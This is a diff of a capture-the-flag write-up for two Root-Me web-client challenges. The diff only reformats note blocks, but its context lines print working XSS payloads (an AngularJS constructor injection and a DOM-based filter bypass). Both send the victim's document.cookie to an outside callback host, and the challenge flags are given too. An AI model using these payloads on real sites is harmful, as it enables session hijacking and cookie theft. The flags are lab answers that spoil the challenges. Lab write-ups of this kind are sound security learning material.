@@ -100,7 +100,9 @@ I thought I had to escape quotes, but nope.
 http://challenge01.root-me.org/web-client/ch35/?name={{constructor.constructor("document.location=`https://uwuos2.free.beeceptor.com/?c=${document.cookie}`")()}}
 ```
 
-> **Note**: Callback took some time
+::: info Note
+Callback took some time
+:::
 
 > Flag: `rootme{@NGu1@R_J$_1$_C001}`
 
@@ -220,6 +222,8 @@ Payload: 1'\ndocument.location=`//uwuos2.free.beeceptor.com/?c=`.concat(document
 URL: http://challenge01.root-me.org/web-client/ch33/?number=1%27%0Adocument.location=`//uwuos2.free.beeceptor.com/?c=`.concat(document.cookie)//
 ```
 
-> **Note**: Callback took a lot more then it should have taken..
+::: info Note
+Callback took a lot more then it should have taken..
+:::
 
 > Flag: `rootme{FilTERS_ByPass_DOm_BASEd_XSS}`
